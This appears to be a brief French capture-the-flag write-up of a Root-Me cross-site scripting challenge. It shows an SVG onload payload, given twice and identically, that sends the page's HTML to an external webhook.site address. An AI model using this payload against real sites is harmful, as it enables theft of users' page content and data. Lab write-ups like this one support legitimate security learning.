
![](../img/Pasted%20image%2020260814235635.png)


Dans ce challenge nous pouvons voir qu'il faudra exfiltrez le contenu de la page. 

Pour ce faire nous allons récupérer les informations du site 



![](../../Pasted%20image%2020260815000649.png)


Première tentative de payload : 
```html
http://challenge01.root-me.org:58008/page?user=<svg onload="document.location.href='//webhook.site/baad9b72-09e4-47bc-b3e9-29368cce0caa?c='.concat(encodeURIComponent(document.body.innerHTML))">
```



Nouveau Payload

```html
http://challenge01.root-me.org:58008/page?user=<svg onload="document.location.href='//webhook.site/baad9b72-09e4-47bc-b3e9-29368cce0caa?c='.concat(encodeURIComponent(document.body.innerHTML))">
```

